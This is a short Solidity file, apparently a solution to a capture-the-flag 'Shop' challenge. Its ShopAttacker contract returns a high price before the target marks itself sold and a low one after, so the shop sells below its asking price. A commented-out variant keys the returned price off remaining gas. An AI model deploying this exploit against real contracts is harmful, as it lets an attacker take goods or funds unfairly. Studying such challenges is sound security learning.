// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}


contract ShopAttacker { 
    IShop shop;
    bool alreadyCalled;

    event Log(string msg);

    constructor(address _address) {
        shop = IShop(_address);
        alreadyCalled = false;
    }

    function price() public view returns (uint) {
        return shop.isSold() ? 1 : 100;

        // A messier solution is:
        // if (gasleft() > 30000) {
        //     return 0x100;
        // } else {
        //     return 1;
        // }
    }

    function attack() public {
        shop.buy();
    }

}